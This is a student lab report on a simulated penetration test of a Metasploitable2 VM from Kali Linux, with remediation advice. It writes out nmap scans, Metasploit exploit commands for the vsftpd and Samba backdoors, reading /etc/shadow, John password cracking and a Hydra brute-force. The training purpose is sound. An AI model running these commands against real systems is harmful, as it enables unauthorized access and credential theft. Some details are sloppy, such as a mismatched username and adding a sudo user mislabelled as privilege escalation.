Stimulating Real-World Network Exploitation and Defense Simulation

Student Name: Ankit Kumar
ERP: 6604992
Course: B.Tech IT
Semester: 4th
Section: B
Date: 18/05/2025

⸻

1. Project Objective

This project simulates real-world cyberattacks in a safe virtual lab to understand penetration testing and defense mechanisms. It covers reconnaissance, scanning, enumeration, exploitation, privilege escalation, password cracking, and security remediation. It teaches how to responsibly identify vulnerabilities using Kali Linux as the attacker and Metasploitable2 as the vulnerable target.

⸻

2. Theory & Background

Penetration Testing (Ethical Hacking) is a simulated attack on a system to evaluate its security posture.

Phases of Penetration Testing:
	1.	Reconnaissance – Passive and active gathering of target information.
	2.	Scanning & Enumeration – Discovering open ports, services, and system details.
	3.	Exploitation – Using vulnerabilities to gain unauthorized access.
	4.	Post-Exploitation – Privilege escalation, persistence, data access.
	5.	Remediation – Securing vulnerabilities to protect systems.

⸻

3. Lab Setup

Component	Details
Attacker OS	Kali Linux (2023 or later)
Target OS	Metasploitable 2
Virtualization	VMware Workstation / VirtualBox
Network Type	Host-Only or Bridged Network

Why Metasploitable?
	•	It contains intentional vulnerabilities for training.
	•	Compatible with Metasploit, Nmap, and John the Ripper.

⸻

4. Tools Used

Tool	Purpose
Nmap	Network scanner for ports, OS, and service detection
Metasploit	Exploitation framework
John the Ripper	Password cracking tool
Netcat / Telnet	Manual banner grabbing and connections


⸻

5. Step-by-Step Tasks with Explanation

⸻

Task 1: Network Discovery and Scanning

Basic Scan

nmap -v 192.168.160.131

	•	-v: Verbose output.
	•	Purpose: Shows basic open ports and host status.

Scan All Ports (0–65535)

nmap -v -p- 192.168.160.131

	•	-p-: Scan all 65535 ports.
	•	Use: To find ports that may be hidden or non-standard.

Service Detection

nmap -v -sV 192.168.160.131

	•	-sV: Detects version of running services.
	•	Helps identify known vulnerabilities in outdated software.

OS Detection

nmap -v -O 192.168.160.131

	•	-O: Attempts to identify the Operating System based on TCP/IP stack fingerprinting.

⸻

Task 2: Enumeration

After scanning, we enumerate:
	•	Open ports and their services
	•	OS details
	•	MAC address, workgroup, etc.

Command Example

nmap -A 192.168.160.131

	•	-A: Aggressive scan includes OS, version, script scanning, traceroute.

⸻

Task 3: Exploitation

⸻

1. Exploit vsftpd 2.3.4 (Backdoor via Port 21)

msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.160.131
set RPORT 21
run

	•	Exploits CVE-2011-2523
	•	Vulnerability: Backdoor shell opens when username contains :)

⸻

2. Exploit Samba (SMB Port 445)

search smb_version
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.160.131
run

Then for exploitation:

use exploit/multi/samba/usermap_script
set RHOST 192.168.160.131
run

	•	CVE-2007-2447
	•	Allows arbitrary code execution through username map script.

⸻

3. Exploit R Services (rexec, rlogin, rsh on Ports 512–514)

nmap -p 512,513,514 -sC -sV --script=vuln 192.168.160.131

	•	--script=vuln: Runs vulnerability detection scripts.

If .rhosts allows root login:

rlogin -l root 192.168.160.131


⸻

Task 4: Privilege Escalation

Create a User with Root Privileges

adduser ankit
passwd ankit
usermod -aG sudo ankit

	•	usermod -aG sudo: Adds user to sudoers group for root rights.

⸻

Task 5: Password Hash Extraction & Cracking

1. View Hashed Password

cat /etc/shadow | grep rahul

2. Save Hash to File

nano ankit_hash.txt

(Paste hash)

3. Crack Password using John

john ankit_hash.txt

To show cracked password:

john ankit_hash.txt --show


⸻

6. Remediation Steps

1. FTP (vsftpd 2.3.4)
	•	CVE: CVE-2011-2523
	•	Fix: Upgrade to vsftpd 3.0.5 or switch to SFTP

sudo apt-get update
sudo apt-get install vsftpd


⸻

2. Samba SMB (v3.0.20)
	•	CVE: CVE-2007-2447, CVE-2017-7494
	•	Fix:
	•	Upgrade to Samba 4.20.1
	•	Disable guest access
	•	Edit /etc/samba/smb.conf

⸻

3. R Services
	•	Outdated and insecure
	•	Fix:

sudo systemctl disable rsh.socket rlogin.socket rexec.socket
sudo apt purge rsh-client rlogin rsh-server


⸻

7. Extra Tools and Additions

Hydra (For Brute-force Login)

hydra -l root -P /usr/share/wordlists/rockyou.txt ftp://192.168.160.131

Nikto (Web vulnerability scanner)

nikto -h http://192.168.160.131


⸻

8. Major Learnings
	•	Practical understanding of scanning, exploitation, and remediation
	•	Hands-on with Nmap, Metasploit, and John
	•	Learned user and password handling on Linux
	•	Identified real-world CVEs and fixed them manually
